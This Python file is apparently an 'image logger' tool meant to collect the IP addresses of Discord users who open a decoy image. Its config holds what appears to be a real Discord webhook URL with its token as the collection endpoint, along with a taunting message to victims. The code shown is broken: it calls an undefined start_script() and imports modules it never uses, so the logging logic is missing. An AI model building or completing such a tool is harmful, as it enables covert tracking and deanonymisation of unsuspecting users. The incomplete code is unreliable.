from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, webbrowser
import sys
import socket
import subprocess
import os
import time
import psutil
import platform
import tempfile
import webbrowser


__app__ = "Discord Image Logger"
__description__ = "martivi aplikacia discordit ip dasadgena"
__version__ = "v2.0"
__author__ = "ALUBALIBALI"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
    "image": "https://media.npr.org/assets/img/2015/09/23/ap_836720500193-d90a20e2b8d735f74d436f36054eb3dc2bd96696.jpg?s=1100&c=85&f=jpeg.jpg",
                                              
    "imageArgument": True, 
    
    "username": "Image Logger", 
    "color": 0xAA00ff , 
  
    "message": { 
        "doMessage": True, 
        "message": "!!!!!!!!run pussy!!!!!!!!!! script made by_samxara",
        "richMessage": True, 
    }
}

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'  
    finally:
        s.close()
    return ip


SERVER_IP = get_ip()
PORT = 7777

print(f"Server IP: {SERVER_IP}, Port: {PORT}")

if __name__ == '__main__':
    while True:
        try:
            start_script()
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)  
            continue  
